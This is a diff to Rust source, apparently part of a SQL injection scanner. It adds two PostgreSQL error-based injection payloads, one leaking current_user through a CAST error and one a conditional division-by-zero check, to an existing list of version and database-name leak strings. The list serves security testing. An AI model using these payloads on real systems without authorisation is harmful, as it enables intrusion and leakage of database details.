@@ -37,12 +37,20 @@ pub fn pg_time_heavy(secs: u64) -> String {
 /// - `CAST(chr(126)||version()||chr(126) AS int)` — tilde-delimited exfil
 ///   variant (`chr()` avoids quoting issues, value surfaces in
 ///   `invalid input syntax for type integer: "~...~"`).
+/// - `CAST((SELECT current_user) AS int)` — Vulnsy cheat-sheet
+///   `PostgreSQL CAST error leak` shape (appended before the conditional
+///   so `--level` head order stays stable).
+/// - `CASE WHEN (1=1) THEN 1/(SELECT 0)` — `PortSwigger` conditional-error
+///   shape (`division by zero` only when the condition holds; appended
+///   last).
 #[must_use]
 pub fn pg_error_payloads() -> Vec<String> {
     vec![
         "' AND CAST((SELECT version()) AS int) --".to_owned(),
         "' AND 1=CAST((SELECT current_database()) AS int) --".to_owned(),
         "' AND 1=CAST((SELECT chr(126)||version()||chr(126)) AS int) --".to_owned(),
+        "' AND 1=CAST((SELECT current_user) AS int) --".to_owned(),
+        "' AND 1=(SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END) --".to_owned(),
     ]
 }
 
